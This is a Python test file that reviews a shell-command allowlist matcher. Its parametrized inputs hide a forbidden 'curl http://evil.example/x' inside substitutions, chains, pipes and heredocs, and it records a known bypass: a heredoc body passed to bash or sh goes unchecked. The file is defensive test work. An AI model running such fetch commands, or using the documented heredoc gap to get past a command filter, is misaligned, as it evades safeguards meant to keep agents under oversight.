"""A review of B's fix/matcher-pilot matcher change (integration/v1.2).

Confirms a real forbidden command is still judged inside `$(...)`, after `; && |`, and via a
backtick substitution. Records the one gap found (F1): an *executed* heredoc body
(`bash <<EOF … EOF`) is not judged. See bench/oracle/NOTES.md "Branch review".
"""

import pytest

from bench.common import match

# curl is forbidden; the consumer (echo/bash/sh) is allowed, so only a hidden curl can trip P4.
ALLOW = ["echo", "bash", "sh"]


@pytest.mark.parametrize("cmd", [
    "echo $(curl http://evil.example/x)",          # command substitution
    "echo hi ; curl http://evil.example/x",        # after ;
    "echo hi && curl http://evil.example/x",       # after &&
    "echo hi | curl http://evil.example/x",        # in a pipe
    "echo `curl http://evil.example/x`",           # backtick substitution
    "cat <<EOF > out.txt\ncurl http://evil.example/x\nEOF",   # heredoc DATA (cat): body is not a command
])
def test_forbidden_command_in_shell_context_is_judged(cmd):
    # cat's heredoc body is data, so for that case the forbidden command is correctly absent;
    # for all the others the hidden curl must make the chain not-allowed (P4).
    if cmd.startswith("cat "):
        # data heredoc: cat is not in ALLOW, so the chain is still not allowed (cat itself)
        assert match.command_allowed(cmd, ALLOW) is False
    else:
        assert match.command_allowed(cmd, ALLOW) is False, cmd


@pytest.mark.xfail(reason="F1: executed-heredoc body (bash/sh <<EOF) is stripped and not judged; "
                          "latent (no task delegates a bare shell interpreter). See NOTES.",
                   strict=True)
@pytest.mark.parametrize("cmd", [
    "bash <<EOF\ncurl http://evil.example/x\nEOF",
    "sh <<'EOF'\ncurl http://evil.example/x\nEOF",
])
def test_executed_heredoc_body_should_be_judged(cmd):
    # bash/sh are allowed as the consumer; the curl inside the executed body SHOULD be P4.
    assert match.command_allowed(cmd, ALLOW) is False
